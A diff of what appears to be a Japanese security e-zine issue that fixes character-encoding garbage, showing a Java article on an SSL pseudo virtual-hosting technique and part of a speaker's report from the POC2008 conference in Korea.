@@ -8,54 +8,54 @@
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-  ---- ��0�́F�ڎ� ---
+  ---- 第0章：目次 ---
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-����1��: �}�j�A�b�NJava�v���O���~���O��9��: 
-			      �` SSL�łȂ񂿂���ăo�[�`�����z�X�g ���� ��
+○第1章: マニアックJavaプログラミング第9回: 
+			      〜 SSLでなんちゃってバーチャルホスト 金床 著
 
-����2��: ���b�c�A�؍��\�\�A�E�g�v�b�g�̂ЂƂ̂�����  �͂�����悤���� ��
+○第2章: レッツ、韓国——アウトプットのひとつのかたち  はせがわようすけ 著
 
-����3��: TV�ǋ��z��                                              ������ ��
+○第3章: TV局狂想曲                                              理事長 著
 
-����4��: �������A�h���X�����Ə������̈�ւ̍U���R�[�h�̒���  Kenji Aiko ��
+○第4章: メモリアドレス推測と小さい領域への攻略コードの注入  Kenji Aiko 著
 
-����5��: ��b�Í��w�u���E��19�� �`������]�̑��ݖ@���`         IPUSIRON ��
+○第5章: 基礎暗号学講座・第19回 〜平方剰余の相互法則〜         IPUSIRON 著
 
-����6��: ���m�点
+○第6章: お知らせ
 
-����7��: ���҃v���t�B�[��
+○第7章: 著者プロフィール
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��1��: �}�j�A�b�NJava�v���O���~���O��9��: �` SSL�łȂ񂿂���ăo�[�`�����z�X�g ---
+--- 第1章: マニアックJavaプログラミング第9回: 〜 SSLでなんちゃってバーチャルホスト ---
 
-���ҁF����
+著者：金床
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@�߳�����߳���܁B�M�҂��͂܂���̧���ި��������ذ�����Java�̃o�O�i�ڂ���
-��WB42�Q�Ɓj�ɂ���openjdk�R�~���j�e�B�ɕ񍐂����Ƃ���A����ƑΉ����Ă�
-�炤���ƂɂȂ����B2009�N�ɏo��ł��낤jdk1.6.0_12�ŏC�������炵���B�[
-���x����B
+　ポウンニチワポウンニチワ。筆者がはまったファイルディスクリプタがリークするJavaのバグ（詳しく
+はWB42参照）についてopenjdkコミュニティに報告したところ、やっと対応しても
+らうことになった。2009年に出るであろうjdk1.6.0_12で修正されるらしい。つー
+か遅いよ。
 
-�@�ŁA���̃o�O�ɂ��Ă�security-dev�Ƃ������[�����O���X�g�Řb�������Ă�
-���̂����A���Sun��Brad�Ƃ����l����������������Ă��ꂽ�B
+　で、このバグについてはsecurity-devというメーリングリストで話し合ってい
+たのだが、先日SunのBradという人がある回避策を教えてくれた。
 
 http://www.nabble.com/-security-dev-00402-:-Re:-NullPointerException-at%09sun.security.ssl.OutputRecord.writeBuffer-td20492154.html
 
-�@JSSE�ł͕��ʂ̃v���[����Socket�i����TCP�̐ڑ����������Ă�����́j�ɂ���
-����悤�ɂ���SSLSocket���쐬���邱�Ƃ��ł���̂ŁA������g���΍������
-�Ȃ��Ă���SSLServerSocket�N���X���g�킸�ɍςށA�Ƃ����̂ł���B�\�[�X�R�[
-�h�͈ȉ��̂悤�Ȃ��̂��B
+　JSSEでは普通のプレーンなSocket（既にTCPの接続が完了しているもの）にかぶ
+せるようにしてSSLSocketを作成することができるので、これを使えば今回問題に
+なっているSSLServerSocketクラスを使わずに済む、というのである。ソースコー
+ドは以下のようなものだ。
 
 -----
 ServerSocket ss = new ServerSocket(port);
@@ -63,27 +63,27 @@ Socket s = ss.accept();
 sslssf.createSocket(s, s.getInetAddress().getHostName(),s.getPort(), false);
 -----
 
-�@�M�҂�createSocket�̑��݂͒m���Ă������A�Ă����肱��̓N���C�A���g����
-�g�����̂��Ǝv���Ă����B���ۂɎ������Ă݂�Ǝ��s�����̂ŁA�u����̓N���C
-�A���g���Ŏg�����񂾂�(`�D�L)�m�S���@�v��Dis���Ă݂�ƁA�Ȃ��setUseClie
-ntMode��false��ݒ肷��΃T�[�o�[���ł��g����Ƃ̂��Ƃł���B�}�W�����B
+　筆者はcreateSocketの存在は知っていたが、てっきりこれはクライアント側で
+使うものだと思っていた。実際に実験してみると失敗したので、「これはクライ
+アント側で使うもんだろ(`Д´)ノゴラァ」とDisってみると、なんとsetUseClie
+ntModeでfalseを設定すればサーバー側でも使えるとのことである。マジすか。
 
-�@�܂肱���������Ƃł���B
+　つまりこういうことである。
 
-�@���ʂ�Java��TCP�T�[�o�[�A�v���������ꍇ�AServerSocket�������accept����B
-accept�����Socket�N���X�̃C���X�^���X�����������B���̃C���X�^���X�ɑ�
-����SSLSocketFactory��createSocket��K�p���A���̖߂�l�ƂȂ�SSLSocket�N��
-�X�̃C���X�^���X��setUseClientMode( false )����̂ł���B����ƂȂ�ƃr�b
-�N���ASSL�T�[�o�[�A�v���ɂȂ��Ă��܂��̂��B
+　普通にJavaでTCPサーバーアプリを書く場合、ServerSocketを作ってacceptする。
+acceptするとSocketクラスのインスタンスが生成される。このインスタンスに対
+してSSLSocketFactoryのcreateSocketを適用し、その戻り値となるSSLSocketクラ
+スのインスタンスにsetUseClientMode( false )するのである。するとなんとビッ
+クリ、SSLサーバーアプリになってしまうのだ。
 
-�@���̃e�N���g���ΕM�҂����ł������o�O�����������̂ł���B�Ȃ񂾂���
-�ȕ��@����Ȃ�����Ƒ��������Ă�B�[�������[��BFOX2�I
+　このテクを使えば筆者を死滅させたバグから解放されるのである。なんだこん
+な方法あるならもっと早く教えてよ。つーかおせーよ。FOX2！
 
 
-��0x02.) �ʂ̑΍�
+■0x02.) 別の対策
 
-�@�c���͕M�҂͕ʂ̑΍���̂��Ă����Bjavassist�œ��I�Ƀp�b�`�𓖂ĂĂ��܂�
-�Ƃ������̂��B�ȉ��ɃR�[�h�̈ꕔ�𔲐�����B
+　…実は筆者は別の対策を採っていた。javassistで動的にパッチを当ててしまう
+というものだ。以下にコードの一部を抜粋する。
 
 -----
 ClassPool pool = ClassPool.getDefault();
@@ -103,83 +103,83 @@ for( int i = 0; i < methodArray.length; ++i )
 Class c = cc.toClass();
 -----
 
-�@WB42�ŏ������Ƃ���OutputRecord�N���X�ɂ�������snull�`�F�b�N�������
-����������Ȃ̂ŁAjavassist�ł���Έꌂ�ŉ������Ă����̂ł���B�܂���
-�R�Ȃ���openjdk���g���Ă���ꍇ�͎������g�Ń\�[�X�R�[�h���C�����邱�Ƃ���
-����B
+　WB42で書いたとおりOutputRecordクラスにたった一行nullチェックを入れれば
+解決する問題なので、javassistであれば一撃で解決してくれるのである。また当
+然ながらopenjdkを使っている場合は自分自身でソースコードを修正することもで
+きる。
 
 
-��0x03.) �{��
+■0x03.) 本題
 
-�@���Ă������炪����̖{��ł���B
+　さてここからが今回の本題である。
 
-�@Java��SSL�T�[�o�[�A�v���������ꍇ�A100�l��100�l��SSLServerSocketFactor
-y�𗘗p���邾�낤�B����������Brad���񂪋����Ă��ꂽ�悤�ɁA���ʂ�ServerS
-ocket��accept���Ă���ASSLSocketFactory�𗘗p����Ƃ������@������̂��B��
-�ɕ��ʂ���Ȃ����@�ł��Ȃ�L�������A���̕��@�ł̂݉\�ƂȂ��@�����݂�
-��B����́ATCP�̐ڑ�����������"��"�ɁA�ǂ̂悤��SSL�ڑ����s���̂����T�[
-�o�[���Ō���ł���Ƃ����_�ł���B
+　JavaでSSLサーバーアプリを書く場合、100人中100人がSSLServerSocketFactor
+yを利用するだろう。しかし今回Bradたんが教えてくれたように、普通のServerS
+ocketでacceptしてから、SSLSocketFactoryを利用するという方法があるのだ。実
+に普通じゃない方法でかなりキモいが、この方法でのみ可能となる手法が存在す
+る。それは、TCPの接続が完了した"後"に、どのようなSSL接続を行うのかをサー
+バー側で決定できるという点である。
 
-�@TCP�̐ڑ�����������ƁA�T�[�o�[���̓N���C�A���g����IP�A�h���X�ƃ|�[�g��
-�m�邱�Ƃ��ł���B�����̏������ɃT�[�o�[�����ǂ̏ؖ������g�p����̂�
-��I�Ԃ��Ƃ��ł��邽�߁ASSL�łȂ񂿂���ăo�[�`�����z�X�g�������ł���̂��B
-
-
-��0x04.) SSL�Ńo�[�`�����z�X�g���
-
-�@���̖��ɂ��ẮuSSL �o�[�`�����z�X�g�v�ŃO�O��J�X�B�����⎸��A�O
-�O���Ă��������t���B�Ƃɂ���SSL�Ńo�[�`�����z�X�g�ł��Ȃ����Ƃ͒��N�V�ăA
-�h�~���ɂƂ��ĔY�݂̎�ł���A�����ɍ��{�I�ȑ΍􂪎���Ă��Ȃ������
-����i�M�҂�2002�N���炢�ɐ����Y�񂾁j�BSNI�Ƃ������Ȃ�ǂ������̎d�g�݂�
-�o���Ă���̂����AIE�̑Ή��������̂Ŗ{�i�I�ȉ^�p���\�ƂȂ�܂ł͂܂���
-���肻�����B����SSL��K�v�Ƃ���E�F�u�T�C�g�̐�����IP�A�h���X���~�����Ƃ�
-���󋵂ɂȂ肪���ł���AIPv4�A�h���X�̌͊��ɂ���ɒǂ��ł��������鎖�Ԃ�
-�Ȃ��Ă���B
+　TCPの接続が完了すると、サーバー側はクライアント側のIPアドレスとポートを
+知ることができる。これらの情報を元にサーバー側がどの証明書を使用するのか
+を選ぶことができるため、SSLでなんちゃってバーチャルホストが実現できるのだ。
 
 
-��0x05.) �Ȃ񂿂���ăo�[�`�����z�X�g�̎���
+■0x04.) SSLでバーチャルホスト問題
 
-�@�����������Ȃ񂿂����SSL�o�[�`�����z�X�g�́A�u�����̃E�F�u�T�C�g�ł�
-�܂��ŏ���HTTP�i�v���[���̂ق��j�ŃA�N�Z�X���s���A���ςȂǂ̒i�K��HTTPS��
-�ڍs����v�Ƃ����_�ɒ��ڂ������̂��B�܂��A�u�N���C�A���g��IP�A�h���X1��
-�����1�l�̃��[�U�������v�Ƃ��������ɂ͎g�����ɂȂ�Ȃ��O��ł̂ݓ��삷��B
-���郆�[�U�̃A�N�Z�X�����N�G�X�g���ƂɈقȂ�IP�A�h���X�ɂȂ�ꍇ��A����
-IP�A�h���X���瓯�����ɕ����̃��[�U���A�N�Z�X����ꍇ�Ȃǁi����AOL�v���L�V
-��ԂƂ��Ēm�����ł���j�͓��삵�Ȃ��B
-
-�@�����Ŏg���z�X�g��218.45.25.5�ł���A�M�҂̃E�F�u�T�C�g�ł���JUMPERZ.N
-ET���u����Ă���T�[�o�[�ł���B���̃T�[�o�[��ł͎����Ɏg����o�[�`����
-�z�X�g�Ƃ��Ĉȉ���3���ғ����ł���B
-
-�@http://www.jumperz.net/index.php
-�@http://guardian.jumperz.net/index.html
-�@http://www.httptunnel.org/
-
-�@�܂��v���[����HTTP�ł����̂�����1�̃T�C�g�ɃA�N�Z�X����B����URL��
-�͗����蓮�ŕύX���A�v���g�R����https://�ɕύX���ăA�N�Z�X���Ă݂�B����
-�ƁA���̃E�F�u�T�C�g�ɓK�����ؖ������g����SSL�̏������s����̂ł���i��
-������3���ׂĂ��C���`�L�Ȃ̂ŃA���[�g�̃_�C�A���O�͏o�邪�A�����ł�CN��
-�z�X�g���ƈ�v����_�ɒ��ڂ��Ă������������j�B
-
-�@���̃f���͂��܂�������ғ����Ă��Ȃ��C������̂ŁA������������ǎ҂��A
-�N�Z�X�����Ƃ��͊��ɓ��삵�Ă��Ȃ���������Ȃ��Bmixi�݂����Ƀx�[�^�łƂ�
-�����Ƃɂ��Ă����B
+　この問題については「SSL バーチャルホスト」でググれカス。あいや失礼、グ
+グってください閣下。とにかくSSLでバーチャルホストできないことは長年新米ア
+ドミンにとって悩みの種であり、未だに根本的な対策が取られていない大問題で
+ある（筆者も2002年くらいに数日悩んだ）。SNIというかなり良い感じの仕組みが
+出来ているのだが、IEの対応が悪いので本格的な運用が可能となるまではまだか
+かりそうだ。結局SSLを必要とするウェブサイトの数だけIPアドレスが欲しいとい
+う状況になりがちであり、IPv4アドレスの枯渇にさらに追い打ちをかける事態と
+なっている。
 
 
-��0x06.) �d�g�݉��
+■0x05.) なんちゃってバーチャルホストの実現
 
-�@�T�[�o�[���͍ŏ��̃v���[���ȕ��̃A�N�Z�X�̍ۂɁA�N���C�A���g�i�����ł�
-�����IP�A�h���X�j���ǂ̃E�F�u�T�C�g�����ɗ����̂���m�邱�Ƃ��ł���̂ŁA
-���̏���ێ����Ă����B���΂炭���ăN���C�A���g��SSL�|�[�g�փA�N�Z�X����
-�������́A�T�[�o�[���̓N���C�A���g��IP�A�h���X����A���̃��[�U�������Ƃ�
-�ŋ߂ł͂ǂ̃E�F�u�T�C�g�����ɗ������𒲂ׁA����ɍ������ؖ�����I������A
-�Ƃ������̂��B���ɃV���v���Ȏd�g�݂ł���B
+　今回実験するなんちゃってSSLバーチャルホストは、「多くのウェブサイトでは
+まず最初にHTTP（プレーンのほう）でアクセスを行い、決済などの段階でHTTPSに
+移行する」という点に注目したものだ。また、「クライアントのIPアドレス1つが
+特定の1人のユーザを示す」という現実には使い物にならない前提でのみ動作する。
+あるユーザのアクセスがリクエストごとに異なるIPアドレスになる場合や、同じ
+IPアドレスから同時期に複数のユーザがアクセスする場合など（俗にAOLプロキシ
+状態として知られるやつである）は動作しない。
+
+　実験で使うホストは218.45.25.5であり、筆者のウェブサイトであるJUMPERZ.N
+ETが置かれているサーバーである。このサーバー上では実験に使えるバーチャル
+ホストとして以下の3つが稼働中である。
+
+　http://www.jumperz.net/index.php
+　http://guardian.jumperz.net/index.html
+　http://www.httptunnel.org/
+
+　まずプレーンなHTTPでこれらのうちの1つのサイトにアクセスする。次にURL入
+力欄を手動で変更し、プロトコルをhttps://に変更してアクセスしてみる。する
+と、そのウェブサイトに適した証明書を使ってSSLの処理が行われるのである（証
+明書は3つすべてがインチキなのでアラートのダイアログは出るが、ここではCNが
+ホスト名と一致する点に注目していただきたい）。
+
+　このデモはいまいち安定稼働していない気がするので、もしかしたら読者がア
+クセスしたときは既に動作していないかもしれない。mixiみたいにベータ版とい
+うことにしておく。
 
 
-��0x07.) �\�[�X�R�[�h
+■0x06.) 仕組み解説
 
-�@����M�҂͎葁�����삳���邽�߂�Guardian@JUMPERZ.NET�̃v���O�C���Ƃ���
-�쐬���Ă݂��B�\�[�X�R�[�h�͈ȉ��̂悤�Ȃ��̂��B
+　サーバー側は最初のプレーンな方のアクセスの際に、クライアント（ここでは
+特定のIPアドレス）がどのウェブサイトを見に来たのかを知ることができるので、
+この情報を保持しておく。しばらくしてクライアントがSSLポートへアクセスして
+きた時は、サーバー側はクライアントのIPアドレスから、このユーザがもっとも
+最近ではどのウェブサイトを見に来たかを調べ、それに合った証明書を選択する、
+というものだ。非常にシンプルな仕組みである。
+
+
+■0x07.) ソースコード
+
+　今回筆者は手早く動作させるためにGuardian@JUMPERZ.NETのプラグインとして
+作成してみた。ソースコードは以下のようなものだ。
 
 -----
 package net.jumperz.app.MGuardian.plugin.sslotf;
@@ -313,380 +313,380 @@ return null;
 }
 -----
 
-�@Java��SSL�T�[�o�[�����������Ƃ�����l�Ȃ�Γ����悤�Ȃ��̂��ȒP�ɏ�����
-���낤�B
+　JavaでSSLサーバーを書いたことがある人ならば同じようなものが簡単に書ける
+だろう。
 
 
-��0x08.) �܂Ƃ�
+■0x08.) まとめ
 
-�@����͕��ʂɃT�[�o�[����accept����Socket�N���X�̃C���X�^���X�𗘗p����
-SSL�T�[�o�[�������ł���Ƃ����L���e�N�����ɁASSL�Ō���I�ȃo�[�`�����z�X
-�g�����������B�����ɂ͏��ƃ��x���̃E�F�u�T�C�g�ł͎g�����ɂȂ�Ȃ����A��
-�����x���̃E�F�u�T�C�g�Ȃ�Ύg�����Ƃ��ł��邩������Ȃ��B����̌Œ�IP�A
-�h���X���O���[�o������������A���Ƃ�SSL�Ńo�[�`�����z�X�g�������I�Ƃ���
-�悤�Ȑl�ɂ͎g����Z�p��������Ȃ��B
+　今回は普通にサーバー側でacceptしたSocketクラスのインスタンスを利用して
+SSLサーバーが実現できるというキモテクを元に、SSLで限定的なバーチャルホス
+トを実現した。現実には商業レベルのウェブサイトでは使い物にならないが、趣
+味レベルのウェブサイトならば使うことができるかもしれない。自宅の固定IPア
+ドレスがグローバル一個だけだが、何とかSSLでバーチャルホストしたい！という
+ような人には使える技術かもしれない。
 
-�@Apache�ł������������̂́A�ǂ����Ă��ݒ�t�@�C���x�[�X�ƂȂ��Ă��܂�
-���߁i�N���C�A���gIP�A�h���X�Əؖ����̊֌W�����I�ɕω����邽�߁j�����
-�낤�B���OpenSSL��API�𒼂Œ@����C����ŃT�[�o�[���������I�Ƃ����悤�Ȑl
-�Ȃ�΁i�ҏW����:����Ȃ���܂���j�������\�ł���B
+　Apacheでこれを実現するのは、どうしても設定ファイルベースとなってしまう
+ため（クライアントIPアドレスと証明書の関係が動的に変化するため）難しいだ
+ろう。一方OpenSSLのAPIを直で叩いてC言語でサーバーを書くぜ！というような人
+ならば（編集部注:そんなやついません）もちろん可能である。
 
 
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
---- ��2��: ���b�c�A�؍��\�\�A�E�g�v�b�g�̂ЂƂ̂����� ---
-
-���ҁF�͂�����悤����
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第2章: レッツ、韓国——アウトプットのひとつのかたち ---
 
-��0x01.) �͂��߂�
+著者：はせがわようすけ
 
-�@�݂Ȃ���A�߳���܁A�͂�����ł��B2008�N11��13���A14���Ɋ؍��ōs��ꂽ
-�uPOC2008�v�ōu������@�����܂����B�C�O�̃Z�L�����e�B�J���t�@�����X��
-�b�����Ƃ��ł������Ƃ͑�ό��h�Ȃ��Ƃł��B����̓X�s�[�J�[�Ƃ��Č���POC2
-008�����|�[�g���܂��傤�B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
-�@�Ȃ��A���\���e�̋Z�p�I�Șb��ɂ��Ă�Kenji����̃u���O���ڂ����̂ŁA��
-������Q�Ƃ��������B
+
+■0x01.) はじめに
+
+　みなさん、ポウンニチワ、はせがわです。2008年11月13日、14日に韓国で行われた
+「POC2008」で講演する機会がありました。海外のセキュリティカンファレンスで
+話すことができたことは大変光栄なことです。今回はスピーカーとして見たPOC2
+008をレポートしましょう。
+
+　なお、発表内容の技術的な話題についてはKenjiさんのブログが詳しいので、そ
+ちらを参照ください。
 
 http://d.hatena.ne.jp/kenjiaiko/20081114/1226614872
 http://d.hatena.ne.jp/kenjiaiko/20081114/1226667633
 
 
-��0x02). �܂����̂��U��
+■0x02). まさかのお誘い
 
-�@10���ɍs��ꂽBlack Hat Japan 2008�ɂāA�u�����I�������ɘb�������Ă���
-����POC�̎�Î҂ł���Vangelis���ł����B�u�I�}�G�̍u���������납������B��
-�Ѝ��x�؍���POC�Řb���Ă�B���N��11���Ȃ̂ł����Ԃɍ���Ȃ����ǁA���N���ЁB
-���{��̂킩��ʖ���p�ӂ���̂ŁB�v�Ƃ����������̂��Ƃ������Ă����̂�
-�����A���͉p�ꂪ�قƂ�ǂ킩��Ȃ��̂ōׂ��ȃj���A���X�����ݐ؂ꂸ�A(��
-���͂��Ќ����߁A�Ќ�����)�ƌy�������A�uThank you�v���x�̕Ԏ�������������
-�����̂ł����B
+　10月に行われたBlack Hat Japan 2008にて、講演を終えた私に話しかけてきた
+方がPOCの主催者であるVangelis氏でした。「オマエの講演おもしろかったよ。ぜ
+ひ今度韓国のPOCで話してよ。今年は11月なのでもう間に合わないけど、来年ぜひ。
+日本語のわかる通訳も用意するので。」といった感じのことを言われていたので
+すが、私は英語がほとんどわからないので細かなニュアンスをつかみ切れず、(は
+いはい社交辞令、社交辞令)と軽く流し、「Thank you」程度の返事をしただけだ
+ったのでした。
 
-�@�����āA���ꂩ��3�T�Ԃقǌo���A�����ǂ����ЂŎd�����Ă���ӂ������
-����ƁA����Vangelis�����烁�[���������̂ł����B�u�X�s�[�J����l����Ȃ�
-�Ȃ����̂ŁA���З��Ăق����B����2�T�Ԃ��Ȃ��̂ō������ɕԎ����~�����v�Ƃ�
-�������e�ł��B
+　そして、それから3週間ほど経ち、いつもどおり会社で仕事しているふりをして
+いると、そのVangelis氏からメールが来たのでした。「スピーカが一人来れなく
+なったので、ぜひ来てほしい。あと2週間もないので今日中に返事が欲しい」とい
+った内容です。
 
-�@�Ƃɂ����Ԏ����}���Ȃ��Ă͂����Ȃ��̂ŁA��Ђɑ��k���A��N�x��POC��
-�X�s�[�J�𖱂߂�fkmr���ɂǂ��������̂��Ƒ��k�������������̂ł����Bfkmr��
-����3�����������ɕԂ��Ă����Ԏ��́u���ЎQ������ׂ��v�Ƃ������̂ł������A
-��Ђ���������Ɂu�s���Ă�����Ⴂ�[�v�ƌy���m���̋����o���̂ŁAVangelis
-���ɂ�OK�̎|��`�����̂ł����B
-
-
-��0x03). ����
-
-�@���\���̂��̂�Black Hat Japan�ł̓��e�Ɠ������̂ł���Ƃ͂����A�����̂�
-���ł͂��łɔR�Ă������ĉߋ��̂��̂ɂȂ��Ă���̂Ŏ����̔��\�ł���ɂ�
-�ւ�炸���e��S���o���Ă��Ȃ��Ƃ��A���������Ȃ�f���͊؍���Windows��ł�
-�肽���Ƃ��A"YellowHat"�l�^�͒ʂ��Ȃ����낤�Ƃ��A���낢��s����ύX���ׂ�
-�_������܂����B
-
-�@���łɔ��\�����܂�2�T�Ԃ�؂��Ă����̂ł����A����Ȃ��Ƃŏł��Ă�����Ke
-nji����Ɂu�����2���Ń[�����珀��������v�Ƃ�����ꂻ���ȋC�������̂ŁA
-�\�ʓI�ɂ͗]�T�����܂����A�������������ς������ς��ɂȂ�Ȃ��珀����i
-�߂Ă����̂ł����B
-
-�@�Ƃ͂����A�p��������ς�킩��Ȃ��̂Ɉ�l�ŏo�����Ă����̂͂��Ȃ�s��
-�ł��������̂ŁA�������Kenji�����A��čs�����Ƃɂ����̂ł����B
+　とにかく返事を急がなくてはいけないので、会社に相談しつつ、昨年度のPOCで
+スピーカを務めたfkmr氏にどうしたものかと相談を持ちかけたのでした。fkmr氏
+から3分もたたずに返ってきた返事は「ぜひ参加するべき」というものでしたし、
+会社からもすぐに「行ってらっしゃいー」と軽いノリの許可が出たので、Vangelis
+氏にはOKの旨を伝えたのでした。
 
 
-��0x04). �؍��֓���
+■0x03). 準備
 
-�@��`�ւ́APOC�̃X�^�b�t2��(���q�吶!!)���}���ɗ��Ă���Ă���A�^�N�V�[
-�ŉ��̃z�e���֌������܂����B�Ԓ��AKenji����͔ޏ������Ɓu���{�̃A�j����
-�������ł��l�C�Ȃ񂾁[�v�Ƃ��p��Řa�₩�ɒk�΂��Ă���̂ł����A���͉p��
-�������ς�킩��Ȃ��̂Łu�؍����ĎԂ̉^�]�r���Ă��킢�ȁ[�v�Ǝv���Ȃ���
-�ԑ�����̕��i�𒭂߂Ă����̂ł����B
+　発表そのものはBlack Hat Japanでの内容と同じものであるとはいえ、自分のな
+かではすでに燃焼しつくして過去のものになっているので自分の発表であるにも
+関わらず内容を全く覚えていないとか、せっかくならデモは韓国語Windows上でや
+りたいとか、"YellowHat"ネタは通じないだろうとか、いろいろ不安や変更すべき
+点がありました。
 
-�@������͊؍��̃��f�B�A����C���^�r���[���󂯂邱�ƂɂȂ�܂����B�z�e��
-�̕����ŋL�҂���u�����炢���H�v�Ɠd�b���󂯂����̂́A�҂����킹�ꏊ�Ȃ�
-�������ς蕷����ꂸ�A�z�e������T�������30���x�ꂭ�炢�ł悤�₭�L�҂�
-�����ł����̂ł����B
-�@���ς�炸�p��͂����ς�킩��Ȃ��̂ŁA�ʖ�Ƃ���Kenji�����������蓯
-�Ȃ����A�L��1(�؍���)���L��2���p��ɖ|��Kenji���񂪓��{��ɖ|�󁨎��A��
-�������i�v���L�V�ȏ�ԂŃC���^�r���[�͐i�݂܂����B����̑����͐��I�ȓ�
-�e�ł͂Ȃ��A�Z�L�����e�B�Ɋւ����ʓI�Șb��ł����̂ŁA�ʖ�̔ς킵����
-����A���̂قƂ�ǂ�Kenji���񂪒��ړ�����������Ă��܂������A�Ō�ɂ�Ken
-ji������ʐ^���B�e���Ă�������肵�Ă��܂����̂ŁA�L�҂̕��ɂ͎�����Ke
-nji����̂ق�����ې[�������̂ł͂Ȃ����Ǝv���܂��B
+　すでに発表当日まで2週間を切っていたのですが、そんなことで焦っていたらKe
+njiさんに「おれは2日でゼロから準備したよ」とか言われそうな気がしたので、
+表面的には余裕をかましつつも、けっこういっぱいいっぱいになりながら準備を進
+めていたのでした。
 
-�@���Ȃ݂ɁA���̂Ƃ��̃C���^�r���[�����ɂ����L�����ȉ��ɂČ��邱�Ƃ��ł��܂��B
+　とはいえ、英語もさっぱりわからないのに一人で出かけていくのはかなり不安
+でもあったので、無理やりKenjiさんを連れて行くことにしたのでした。
+
+
+■0x04). 韓国へ到着
+
+　空港へは、POCのスタッフ2名(女子大生!!)が迎えに来てくれており、タクシー
+で会場のホテルへ向かいました。車中、Kenjiさんは彼女たちと「日本のアニメは
+そっちでも人気なんだー」とか英語で和やかに談笑しているのですが、私は英語
+がさっぱりわかんないので「韓国って車の運転荒くてこわいなー」と思いながら
+車窓からの風景を眺めていたのでした。
+
+　当日夜は韓国のメディアからインタビューを受けることになりました。ホテル
+の部屋で記者から「今からいい？」と電話を受けたものの、待ち合わせ場所など
+がさっぱり聞き取れず、ホテル内を探し回って30分遅れくらいでようやく記者と
+合流できたのでした。
+　相変わらず英語はさっぱりわからないので、通訳としてKenjiさんも無理やり同
+席させ、記者1(韓国語)→記者2が英語に翻訳→Kenjiさんが日本語に翻訳→私、と
+いう多段プロキシな状態でインタビューは進みました。質問の多くは専門的な内
+容ではなく、セキュリティに関する一般的な話題でしたので、通訳の煩わしさも
+あり、そのほとんどにKenjiさんが直接答えたりもしていましたし、最後にはKen
+jiさんも写真を撮影してもらったりしていましたので、記者の方には私よりもKe
+njiさんのほうが印象深かったのではないかと思います。
+
+　ちなみに、そのときのインタビューを元にした記事が以下にて見ることができます。
 
 http://translate.google.co.jp/translate?hl=ja&sl=ko&u=http://www.boannews.com/media/view.asp%3Fidx%3D12629%26kind%3D1&sa=X&oi=translate&resnum=1&ct=result&prev=/search%3Fq%3Dsite:boannews.com%2B%25ED%2595%259C%25EA%25B5%25AD,%2B%25EB%25B6%2588%25EB%25B2%2
 
 
-��0x05). ���\
+■0x05). 発表
 
-�@Black Hat Japan�ł̔��\�ɔ�ׁAPOC�Ƃ����C�x���g�̒��u�҂́A����������
-�͊w�����ۂ���҂������A�������J�W���A���ȕ����قƂ�ǂł����B�Ⴓ�䂦��
-�߂��Ȃ̂��A�ނ�͎����ɋ����̂Ȃ����\���ƁA�e�͂Ȃ����ɓ˂������ĐQ�Ă�
-�܂��B���̔��\�ł́A�K���ɂ��Q�Ă���l�͌����Ȃ������̂ŁA����Ȃ�ɂ�
-��Ȃɋ����������Ă��炦���悤�ŁA���ꂾ���Ŗ����ł��܂����B
+　Black Hat Japanでの発表に比べ、POCというイベントの聴講者は、見た感じで
+は学生っぽい若者が多く、服装もカジュアルな方がほとんどでした。若さゆえの
+過ちなのか、彼らは自分に興味のない発表だと、容赦なく机に突っ伏して寝てい
+ます。私の発表では、幸いにも寝ている人は見られなかったので、それなりにみ
+んなに興味を持ってもらえたようで、それだけで満足できました。
 
-�@���̃X�s�[�J�̔��\�⒮�O�̔��������Ă���ƁA�����̈Ⴂ����Ȃ̂��A�؍�
-�ł͗��_�⌤���I�ȓ��e�����A����I�Ȏ������ʂ̂ق����D�܂��悤�Ɏv��
-�܂����B���̓_�ł́A�����g�̔��\�ł͗����̐��������łȂ����X�ɊȒP�ȃf��
-���܂߂Ă����̂�����t�����̂����m��܂���B
-
-
-��0x06). �I���
-
-�@10����Black Hat Japan�A11����POC2008�Ƒ傫�ȃC�x���g�ɗ��đ����ɎQ����
-�Ďv�����̂ł����A��͂��؂Ȃ͉̂p�ꂾ�Ƃ������Ƃ����߂ĒɊ����܂����B
-�@�C�x���g��ʂ��đ����̐l�Ɖ�A��������̃R�~���j�P�[�V�������ł��邹
-�������̋@��Ȃ̂ɁA�p�ꂪ�킩��Ȃ��ƑS�������ł��܂���B2009�N�͂�����
